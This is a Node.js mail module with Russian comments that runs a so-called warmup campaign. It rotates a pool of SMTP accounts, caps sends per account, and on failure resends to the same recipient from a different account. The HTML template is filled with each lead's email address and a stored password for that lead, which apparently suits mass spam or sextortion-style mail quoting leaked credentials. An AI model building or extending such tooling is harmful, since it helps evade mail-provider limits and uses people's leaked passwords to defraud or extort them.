'use strict';

const fs = require('fs');
const path = require('path');
const mailService = require('./mailService');

let DATA_DIR = path.join(__dirname, '..', '..', 'data');

function cloneJson(obj) {
  return JSON.parse(JSON.stringify(obj));
}

let _warmupEmailCache = null;
let _warmupSmtpStatsCache = null;

function init(opts) {
  if (opts && opts.dataDir) DATA_DIR = opts.dataDir;
  reloadWarmupCachesFromDisk();
}

function warmupEmailFile() {
  return path.join(DATA_DIR, 'warmup-email.json');
}

function warmupSmtpStatsFile() {
  return path.join(DATA_DIR, 'warmup-smtp-stats.json');
}

function loadWarmupEmailFromDisk() {
  try {
    const f = warmupEmailFile();
    if (fs.existsSync(f)) {
      const raw = fs.readFileSync(f, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  return { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' } };
}

function loadWarmupSmtpStatsFromDisk() {
  try {
    const f = warmupSmtpStatsFile();
    if (fs.existsSync(f)) {
      const raw = fs.readFileSync(f, 'utf8');
      const data = JSON.parse(raw);
      if (data && typeof data === 'object') return data;
    }
  } catch (e) {}
  return {};
}

function reloadWarmupCachesFromDisk() {
  _warmupEmailCache = loadWarmupEmailFromDisk();
  _warmupSmtpStatsCache = loadWarmupSmtpStatsFromDisk();
}

function readWarmupEmailConfig() {
  if (!_warmupEmailCache) reloadWarmupCachesFromDisk();
  return cloneJson(_warmupEmailCache);
}

function writeWarmupEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(warmupEmailFile(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
    const t = toWrite || {};
    if (t.configs && Array.isArray(t.configs)) {
      const currentId = t.currentId || (t.configs[0] && t.configs[0].id) || null;
      const current = t.configs.find(function (c) { return c.id == currentId; }) || t.configs[0] || null;
      _warmupEmailCache = { currentId, configs: t.configs, current };
    } else {
      _warmupEmailCache = loadWarmupEmailFromDisk();
    }
  } catch (e) {}
}

function readWarmupSmtpStats() {
  if (_warmupSmtpStatsCache == null) reloadWarmupCachesFromDisk();
  return Object.assign({}, _warmupSmtpStatsCache);
}

function writeWarmupSmtpStats(stats) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const next = stats && typeof stats === 'object' ? stats : {};
    fs.writeFileSync(warmupSmtpStatsFile(), JSON.stringify(next, null, 2), 'utf8');
    _warmupSmtpStatsCache = Object.assign({}, next);
  } catch (e) {}
}

/** Очистить `warmup-smtp-stats.json` и счётчики в памяти (в т.ч. при работающем прогреве). */
function clearWarmupSmtpStatsAll() {
  writeWarmupSmtpStats({});
  warmupState.sentPerSmtp = {};
  warmupState.totalSent = 0;
}

const WARMUP_LOG_MAX = 500;

/** Одновременно не более N исходящих SMTP (снижает фризы event loop). */
const WARMUP_MAX_CONCURRENT_SENDS = 5;

const warmupState = {
  running: false,
  stopped: false,
  paused: false,
  configs: [],
  flatList: [],
  leads: [],
  perSmtpLimit: 0,
  delayMs: 2000,
  numThreads: 1,
  sentPerSmtp: {},
  log: [],
  totalSent: 0,
  activeSendCount: 0,
  /**
   * На время запуска прогрева: по ключу получателя (email lower) — Set fromEmail, с которых уже был отказ на этот адрес.
   * Иначе после исчерпания fallback снова выбирается первый SMTP в ротации (тот же From).
   */
  failedFromByRecipient: null,
  /** После ошибки: очередь повтора на тот же toEmail другим SMTP (пока есть кандидаты). */
  fallbackSameRecipient: null
};

function warmupConfigsMatch(a, b) {
  if (!a || !b) return false;
  const ida = a.id != null ? String(a.id) : '';
  const idb = b.id != null ? String(b.id) : '';
  if (ida && idb) return ida === idb;
  return a === b;
}

function recipientFailureKey(toEmail) {
  return String(toEmail || '').trim().toLowerCase();
}

function getFailedFromMapForRecipient(toEmail) {
  const store = warmupState.failedFromByRecipient;
  if (!store) return null;
  const k = recipientFailureKey(toEmail);
  return k ? store[k] : null;
}

function recordRecipientSmtpFailure(toEmail, fromEmail) {
  const fe = String(fromEmail || '').trim();
  const k = recipientFailureKey(toEmail);
  if (!k || !fe) return;
  if (!warmupState.failedFromByRecipient) warmupState.failedFromByRecipient = Object.create(null);
  if (!warmupState.failedFromByRecipient[k]) warmupState.failedFromByRecipient[k] = Object.create(null);
  warmupState.failedFromByRecipient[k][fe] = true;
}

function clearRecipientSmtpFailures(toEmail) {
  const k = recipientFailureKey(toEmail);
  if (warmupState.failedFromByRecipient && k) delete warmupState.failedFromByRecipient[k];
}

/** Есть ли для этого получателя и конфига хотя бы один SMTP с запасом по лимиту и без записи об ошибке в этом запуске. */
function noViableSmtpLeftForRecipient(toEmail, cfg) {
  const flatList = warmupState.flatList;
  const limit = warmupState.perSmtpLimit;
  const sentPerSmtp = warmupState.sentPerSmtp;
  const bad = getFailedFromMapForRecipient(toEmail);
  for (let i = 0; i < flatList.length; i++) {
    const entry = flatList[i];
    if (!warmupConfigsMatch(entry.config, cfg)) continue;
    const fe = entry.smtp.fromEmail;
    if ((sentPerSmtp[fe] || 0) >= limit) continue;
    if (bad && bad[fe]) continue;
    return false;
  }
  return true;
}

/**
 * Следующий SMTP того же конфига: не из failedFromByRecipient[to], с запасом по лимиту.
 */
function pickFallbackJobSync() {
  const fb = warmupState.fallbackSameRecipient;
  if (!fb || !fb.cfg || !fb.toEmail) return null;
  const flatList = warmupState.flatList;
  const limit = warmupState.perSmtpLimit;
  const sentPerSmtp = warmupState.sentPerSmtp;
  const bad = getFailedFromMapForRecipient(fb.toEmail) || Object.create(null);
  for (let i = 0; i < flatList.length; i++) {
    const entry = flatList[i];
    if (!warmupConfigsMatch(entry.config, fb.cfg)) continue;
    const fe = entry.smtp.fromEmail;
    if (bad[fe]) continue;
    if ((sentPerSmtp[fe] || 0) < limit) {
      sentPerSmtp[fe] = (sentPerSmtp[fe] || 0) + 1;
      return {
        cfg: fb.cfg,
        smtp: entry.smtp,
        lead: fb.lead,
        toEmail: fb.toEmail,
        isFallback: true
      };
    }
  }
  const to = String(fb.toEmail || '').trim();
  warmupState.log.push({
    text: '[Прогрев: ' + to + ' — нет доступного SMTP (лимит по счётчику из статистики и/или все уже дали ошибку на этот адрес в этом запуске)]',
    type: 'muted'
  });
  if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
  warmupState.fallbackSameRecipient = null;
  return null;
}

function scheduleWarmupPump() {
  setImmediate(runWarmupPump);
}

function runWarmupPump() {
  const nodemailer = mailService.getNodemailer();
  if (warmupState.stopped) {
    if (warmupState.activeSendCount <= 0) {
      warmupState.running = false;
      warmupState.failedFromByRecipient = null;
      warmupState.log.push({ text: '[Прогрев остановлен]', type: 'muted' });
      if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    }
    return;
  }
  if (!warmupState.running && warmupState.activeSendCount <= 0) return;
  if (!warmupState.running && warmupState.activeSendCount > 0) return;
  if (warmupState.paused) {
    setTimeout(scheduleWarmupPump, 500);
    return;
  }
  const maxConcurrent = Math.min(WARMUP_MAX_CONCURRENT_SENDS, Math.max(1, warmupState.numThreads | 0));
  let loopSafety = 0;
  while (warmupState.activeSendCount < maxConcurrent && warmupState.running && !warmupState.stopped && !warmupState.paused) {
    if (++loopSafety > 10000) {
      setTimeout(scheduleWarmupPump, 0);
      return;
    }
    let job = pickFallbackJobSync();
    if (!job) {
      job = pickWarmupJobSync();
    }
    if (job === 'stuck') {
      warmupState.running = false;
      warmupState.fallbackSameRecipient = null;
      warmupState.log.push({
        text: '[Прогрев остановлен: на текущего получателя не осталось ни одного подходящего SMTP (см. лимиты в статистике и ошибки выше). Сбросьте счётчики SMTP или увеличьте лимит.]',
        type: 'error'
      });
      if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
      return;
    }
    if (job === 'done') {
      warmupState.running = false;
      warmupState.fallbackSameRecipient = null;
      warmupState.failedFromByRecipient = null;
      warmupState.log.push({ text: '[Прогрев завершён: лимит по каждому SMTP достигнут]', type: 'muted' });
      if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
      return;
    }
    if (job === 'empty') {
      warmupState.running = false;
      warmupState.fallbackSameRecipient = null;
      warmupState.failedFromByRecipient = null;
      warmupState.log.push({ text: '[Прогрев завершён: нет SMTP или лидов]', type: 'muted' });
      if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
      return;
    }
    if (job.skipNoEmail) {
      continue;
    }
    const { cfg, smtp, toEmail, isFallback } = job;
    if (!nodemailer) {
      warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
      if (!isFallback) warmupState.totalSent--;
      warmupState.log.push({ text: '[nodemailer не установлен]', type: 'error' });
      if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
      warmupState.running = false;
      return;
    }
    const password = (job.lead && job.lead.password) ? String(job.lead.password).trim() : '';
    let html = (cfg.html || '').replace(/_email_/g, toEmail).replace(/_password_/g, password);
    const attachments = [];
    if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
      try {
        const buf = Buffer.from(cfg.image1Base64, 'base64');
        html = html.replace(/_src1_/g, 'cid:image1@mail');
        attachments.push({
          filename: 'image1.png',
          contentType: 'image/png',
          contentTransferEncoding: 'base64',
          content: buf,
          cid: 'image1@mail'
        });
      } catch (e) {}
    } else if (html.indexOf('_src1_') !== -1) {
      html = html.replace(/_src1_/g, '');
    }
    const transporter = nodemailer.createTransport({
      host: smtp.host,
      port: smtp.port,
      secure: smtp.port === 465,
      auth: { user: smtp.user, pass: smtp.password }
    });
    const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
    const mailOptions = {
      from: fromStr,
      to: toEmail,
      subject: (cfg.title || '').trim() || 'Message',
      html,
      attachments: attachments.length ? attachments : undefined,
      envelope: { from: smtp.fromEmail, to: toEmail },
      textEncoding: 'quoted-printable'
    };
    warmupState.activeSendCount++;
    transporter.sendMail(mailOptions).then(() => {
      try {
        clearRecipientSmtpFailures(toEmail);
        if (isFallback) {
          warmupState.fallbackSameRecipient = null;
          warmupState.totalSent++;
        }
        writeWarmupSmtpStats(warmupState.sentPerSmtp);
        const prefix = isFallback ? 'Отправлено (другой SMTP) с ' : 'Отправлено с ';
        warmupState.log.push({ text: prefix + smtp.fromEmail + ' на ' + toEmail, type: 'success' });
        if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
      } catch (e) {
        console.error('[warmup] after send:', e);
      }
    }).catch((err) => {
      try {
        warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
        if (!isFallback) warmupState.totalSent--;
        try {
          writeWarmupSmtpStats(warmupState.sentPerSmtp);
        } catch (e2) { /* ignore */ }
        const msg = (err && err.message ? err.message : String(err)).slice(0, 150);
        recordRecipientSmtpFailure(toEmail, smtp.fromEmail);
        warmupState.log.push({ text: '[Ошибка ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg + ']', type: 'error' });
        if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
        if (isFallback) {
          /* failedFrom уже пополнен; pickFallback возьмёт следующий SMTP */
        } else {
          warmupState.fallbackSameRecipient = {
            cfg: job.cfg,
            lead: job.lead,
            toEmail: job.toEmail
          };
          warmupState.log.push({
            text: '[Прогрев: повтор на ' + String(job.toEmail || '').trim() + ' другим SMTP из пула]',
            type: 'muted'
          });
          if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
        }
      } catch (e) {
        console.error('[warmup] catch log:', e);
      }
    }).finally(() => {
      warmupState.activeSendCount--;
      setTimeout(scheduleWarmupPump, warmupState.delayMs);
    });
  }
}

/**
 * Синхронный выбор слота (без await между проверкой и резервом — безопасно при параллельных sendMail).
 * @returns {{ cfg, smtp, lead, toEmail, leadIndex } | 'done' | 'stuck' | 'empty' | { skipNoEmail: true }}
 */
function pickWarmupJobSync() {
  const flatList = warmupState.flatList;
  const leads = warmupState.leads;
  const limit = warmupState.perSmtpLimit;
  const sentPerSmtp = warmupState.sentPerSmtp;
  if (!flatList.length || !leads.length) return 'empty';
  const s = warmupState.totalSent;
  const leadIndex = s % leads.length;
  const lead = leads[leadIndex];
  const toEmail = (lead && lead.email) ? String(lead.email).trim() : '';
  if (!toEmail) {
    warmupState.totalSent++;
    return { skipNoEmail: true };
  }
  const bad = getFailedFromMapForRecipient(toEmail);
  let chosen = null;
  for (let k = 0; k < flatList.length; k++) {
    const idx = (s + k) % flatList.length;
    const entry = flatList[idx];
    const fe = entry.smtp.fromEmail;
    if (bad && bad[fe]) continue;
    if ((sentPerSmtp[fe] || 0) < limit) {
      chosen = entry;
      break;
    }
  }
  if (!chosen) {
    const anyUnderLimit = flatList.some(function (e) {
      return (sentPerSmtp[e.smtp.fromEmail] || 0) < limit;
    });
    if (!anyUnderLimit) return 'done';
    const refCfg = flatList[0] && flatList[0].config;
    if (refCfg && noViableSmtpLeftForRecipient(toEmail, refCfg)) return 'stuck';
    return 'done';
  }
  warmupState.totalSent++;
  const smtp = chosen.smtp;
  const cfg = chosen.config;
  sentPerSmtp[smtp.fromEmail] = (sentPerSmtp[smtp.fromEmail] || 0) + 1;
  return { cfg, smtp, lead, toEmail, leadIndex, isFallback: false };
}

function runWarmupStep() {
  scheduleWarmupPump();
}

module.exports = {
  init,
  WARMUP_LOG_MAX,
  WARMUP_MAX_CONCURRENT_SENDS,
  warmupState,
  runWarmupStep,
  scheduleWarmupPump,
  readWarmupEmailConfig,
  writeWarmupEmailConfig,
  readWarmupSmtpStats,
  writeWarmupSmtpStats,
  clearWarmupSmtpStatsAll,
  reloadWarmupCachesFromDisk,
  warmupEmailFile,
  warmupSmtpStatsFile,
};
